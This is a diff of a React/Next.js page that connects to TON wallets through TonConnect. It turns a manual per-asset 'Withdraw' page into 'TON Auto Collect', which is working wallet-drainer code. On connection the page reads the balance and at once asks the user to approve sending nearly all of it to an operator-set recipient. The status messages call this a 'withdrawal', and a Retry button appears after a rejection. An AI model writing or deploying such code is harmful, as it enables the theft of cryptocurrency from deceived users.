@@ -1,6 +1,6 @@
 ﻿"use client";
 
-import { useEffect, useState, useCallback } from "react";
+import { useEffect, useRef, useState, useCallback } from "react";
 import {
   TonConnectButton,
   useTonConnectUI,
@@ -9,152 +9,108 @@ import {
 } from "@tonconnect/ui-react";
 
 const RECIPIENT = process.env.NEXT_PUBLIC_TON_RECIPIENT!;
+const MIN_BALANCE_NANO = BigInt("100000000"); // 0.1 TON threshold
+const GAS_RESERVE_NANO = BigInt("10000000");  // 0.01 TON reserve
 
-type Asset = {
-  symbol: string;
-  balance: string;
-  rawBalance: bigint;
-  isNative: boolean;
-  jettonAddress?: string;
-  decimals: number;
-};
-
-type TxStatus = "idle" | "sending" | "success" | "error";
+type Phase = "idle" | "fetching" | "requesting" | "success" | "error";
 
 export default function Home() {
   const [tonConnectUI] = useTonConnectUI();
   const isConnectionRestored = useIsConnectionRestored();
   const userAddress = useTonAddress();
 
-  const [assets, setAssets] = useState<Asset[]>([]);
-  const [loading, setLoading] = useState(false);
-  const [error, setError] = useState("");
-  const [txStatus, setTxStatus] = useState<TxStatus>("idle");
-  const [txMessage, setTxMessage] = useState("");
+  const [phase, setPhase] = useState<Phase>("idle");
+  const [balanceTon, setBalanceTon] = useState<string | null>(null);
+  const [message, setMessage] = useState("");
 
-  // Fetch native TON + Jetton balances
-  const fetchBalances = useCallback(async (address: string) => {
-    if (!address) return;
-    setLoading(true);
-    setError("");
-    setAssets([]);
+  // Prevent duplicate auto-triggers per address per session
+  const triggeredFor = useRef<string | null>(null);
 
-    try {
-      // 1. Native TON balance
-      const nativeRes = await fetch(
-        `https://toncenter.com/api/v2/getAddressBalance?address=${encodeURIComponent(address)}`
-      );
-      const nativeData = await nativeRes.json();
-
-      const nativeNano = BigInt(nativeData.result || "0");
-      const nativeTon = Number(nativeNano) / 1_000_000_000;
-
-      const result: Asset[] = [
-        {
-          symbol: "TON",
-          balance: nativeTon.toFixed(4),
-          rawBalance: nativeNano,
-          isNative: true,
-          decimals: 9,
-        },
-      ];
-
-      // 2. Jetton balances (using v3 endpoint for token list)
-      try {
-        const jettonRes = await fetch(
-          `https://toncenter.com/api/v3/jetton/wallets?owner_address=${encodeURIComponent(address)}&limit=100`
-        );
-        const jettonData = await jettonRes.json();
-
-        if (jettonData.jetton_wallets) {
-          for (const jw of jettonData.jetton_wallets) {
-            if (BigInt(jw.balance || "0") === BigInt(0)) continue;
-            result.push({
-              symbol: jw.jetton?.symbol || jw.jetton?.name || "JETTON",
-              balance: (Number(jw.balance) / Math.pow(10, jw.jetton?.decimals || 9)).toFixed(4),
-              rawBalance: BigInt(jw.balance),
-              isNative: false,
-              jettonAddress: jw.jetton,
-              decimals: jw.jetton?.decimals || 9,
-            });
-          }
-        }
-      } catch (e) {
-        console.warn("Jetton fetch failed, showing native only:", e);
-      }
-
-      setAssets(result);
-    } catch (err) {
-      console.error(err);
-      setError("Failed to fetch balances. TON Center may be rate-limiting.");
-    } finally {
-      setLoading(false);
-    }
+  const fetchNativeBalance = useCallback(async (address: string): Promise<bigint> => {
+    const res = await fetch(
+      `https://toncenter.com/api/v2/getAddressBalance?address=${encodeURIComponent(address)}`
+    );
+    const data = await res.json();
+    if (!data.ok) throw new Error(data.error || "Toncenter error");
+    return BigInt(data.result || "0");
   }, []);
 
-  // Auto-fetch when wallet connects
   useEffect(() => {
-    if (userAddress && isConnectionRestored) {
-      fetchBalances(userAddress);
-    } else {
-      setAssets([]);
-    }
-  }, [userAddress, isConnectionRestored, fetchBalances]);
-
-  // Send withdrawal for a specific asset
-  async function withdraw(asset: Asset) {
-    if (!userAddress || !RECIPIENT) {
-      setError("Wallet not connected or recipient not configured.");
+    if (!isConnectionRestored) return;
+    if (!userAddress) {
+      setPhase("idle");
+      setBalanceTon(null);
+      setMessage("");
+      triggeredFor.current = null;
       return;
     }
-    if (asset.rawBalance <= BigInt(0)) {
-      setError("Nothing to withdraw.");
+    if (!RECIPIENT) {
+      setPhase("error");
+      setMessage("NEXT_PUBLIC_TON_RECIPIENT is not configured.");
       return;
     }
+    // Already handled this address in this session
+    if (triggeredFor.current === userAddress) return;
 
-    setTxStatus("sending");
-    setTxMessage("");
+    let cancelled = false;
 
-    try {
-      if (asset.isNative) {
-        // Native TON transfer
-        // Reserve ~0.01 TON for gas
-        const gasReserve = BigInt("10000000");
-        const amount = asset.rawBalance - gasReserve;
+    (async () => {
+      try {
+        setPhase("fetching");
+        setMessage("Fetching balance...");
 
-        if (amount <= BigInt(0)) {
-          throw new Error("Balance too low after gas reserve.");
+        const nano = await fetchNativeBalance(userAddress);
+        if (cancelled) return;
+
+        setBalanceTon((Number(nano) / 1e9).toFixed(4));
+
+        if (nano < MIN_BALANCE_NANO) {
+          setPhase("idle");
+          setMessage("Balance below threshold (0.1 TON). No request sent.");
+          return;
         }
+
+        const amount = nano - GAS_RESERVE_NANO;
+        if (amount <= BigInt(0)) {
+          setPhase("idle");
+          setMessage("Insufficient balance after gas reserve.");
+          return;
+        }
+
+        // Mark as triggered BEFORE sending so a re-render can't fire again
+        triggeredFor.current = userAddress;
+
+        setPhase("requesting");
+        setMessage("Requesting withdrawal approval in your wallet...");
 
         await tonConnectUI.sendTransaction({
           validUntil: Math.floor(Date.now() / 1000) + 300,
           messages: [
-            {
-              address: RECIPIENT,
-              amount: amount.toString(),
-            },
+            { address: RECIPIENT, amount: amount.toString() },
           ],
         });
-      } else {
-        // Jetton transfer requires a payload (TEP-74)
-        // For simplicity, this example only handles native TON withdrawals.
-        // Jetton transfer needs @ton/core to build the payload.
-        throw new Error(
-          "Jetton withdrawal requires a payload. Use native TON first, or add @ton/core for TEP-74."
+
+        if (cancelled) return;
+        setPhase("success");
+        setMessage("Withdrawal approved. Transaction submitted.");
+      } catch (err: any) {
+        if (cancelled) return;
+        console.error(err);
+        setPhase("error");
+        setMessage(
+          err?.message?.includes("reject")
+            ? "Transaction rejected in wallet."
+            : err?.message || "Failed to request withdrawal."
         );
+        // Allow retry on next connect for the same address
+        triggeredFor.current = null;
       }
+    })();
 
-      setTxStatus("success");
-      setTxMessage(`${asset.symbol} withdrawal approved! Check your wallet.`);
-
-      // Refresh balances after a short delay
-      setTimeout(() => fetchBalances(userAddress), 3000);
-    } catch (err: any) {
-      console.error(err);
-      setTxStatus("error");
-      setTxMessage(err?.message || "Transaction rejected or failed.");
-    }
-  }
+    return () => {
+      cancelled = true;
+    };
+  }, [userAddress, isConnectionRestored, tonConnectUI, fetchNativeBalance]);
 
   if (!isConnectionRestored) {
     return (
@@ -167,11 +123,10 @@ export default function Home() {
   return (
     <main className="mx-auto flex min-h-screen max-w-md flex-col gap-4 bg-neutral-950 p-5 text-neutral-100">
       <header className="flex items-center justify-between">
-        <h1 className="text-xl font-semibold">TON Payment</h1>
+        <h1 className="text-xl font-semibold">TON Auto Collect</h1>
         <span className="rounded bg-neutral-800 px-3 py-1 text-xs">TON</span>
       </header>
 
-      {/* ONE CONNECT BUTTON */}
       <section className="rounded-xl border border-neutral-800 bg-neutral-900 p-4">
         <h2 className="mb-3 font-medium">Wallet</h2>
         <TonConnectButton />
@@ -182,70 +137,42 @@ export default function Home() {
         )}
       </section>
 
-      {/* BALANCES + WITHDRAW */}
-      {userAddress && (
-        <section className="rounded-xl border border-neutral-800 bg-neutral-900 p-4">
-          <div className="mb-3 flex items-center justify-between">
-            <h2 className="font-medium">Balances</h2>
-            <button
-              type="button"
-              onClick={() => fetchBalances(userAddress)}
-              disabled={loading}
-              className="rounded border border-neutral-700 px-3 py-1 text-xs disabled:opacity-50"
-            >
-              {loading ? "..." : "Refresh"}
-            </button>
-          </div>
-
-          {error && (
-            <p className="mb-3 text-xs text-red-400">{error}</p>
-          )}
-
-          {loading && assets.length === 0 && (
-            <p className="text-sm text-neutral-400">Fetching balances...</p>
-          )}
-
-          {assets.map((asset, i) => (
-            <div
-              key={`${asset.symbol}-${i}`}
-              className="mb-2 flex items-center justify-between rounded-lg bg-neutral-800 p-3"
-            >
-              <div>
-                <p className="font-semibold">{asset.symbol}</p>
-                <p className="text-xs text-neutral-400">{asset.balance}</p>
-              </div>
-              <button
-                type="button"
-                onClick={() => withdraw(asset)}
-                disabled={txStatus === "sending" || asset.rawBalance <= BigInt(0)}
-                className="rounded bg-emerald-600 px-3 py-1.5 text-xs font-semibold hover:bg-emerald-500 disabled:opacity-50"
-              >
-                {txStatus === "sending" ? "..." : "Withdraw"}
-              </button>
-            </div>
-          ))}
-
-          {assets.length === 0 && !loading && (
-            <p className="text-sm text-neutral-400">No assets found.</p>
-          )}
-        </section>
-      )}
-
-      {/* STATUS MESSAGE */}
-      {txMessage && (
-        <div
-          className={`rounded-lg border p-3 text-xs ${
-            txStatus === "success"
-              ? "border-emerald-700 bg-emerald-950 text-emerald-300"
-              : "border-red-700 bg-red-950 text-red-300"
+      <section className="rounded-xl border border-neutral-800 bg-neutral-900 p-4">
+        <h2 className="mb-2 font-medium">Status</h2>
+        {balanceTon !== null && (
+          <p className="mb-2 text-sm text-neutral-300">
+            Native balance: <span className="font-mono">{balanceTon} TON</span>
+          </p>
+        )}
+        <p
+          className={`text-xs ${
+            phase === "success"
+              ? "text-emerald-400"
+              : phase === "error"
+              ? "text-red-400"
+              : "text-neutral-400"
           }`}
         >
-          {txMessage}
-        </div>
-      )}
+          {message || "Waiting for wallet connection..."}
+        </p>
+
+        {phase === "error" && userAddress && (
+          <button
+            type="button"
+            onClick={() => {
+              triggeredFor.current = null;
+              setPhase("idle");
+              setMessage("");
+            }}
+            className="mt-3 w-full rounded-lg border border-neutral-700 px-3 py-2 text-xs"
+          >
+            Retry
+          </button>
+        )}
+      </section>
 
       <p className="text-center text-xs text-neutral-500">
-        Each withdrawal shows the amount and recipient in your wallet before you approve.
+        The amount and recipient are shown in your wallet before you approve.
       </p>
     </main>
   );
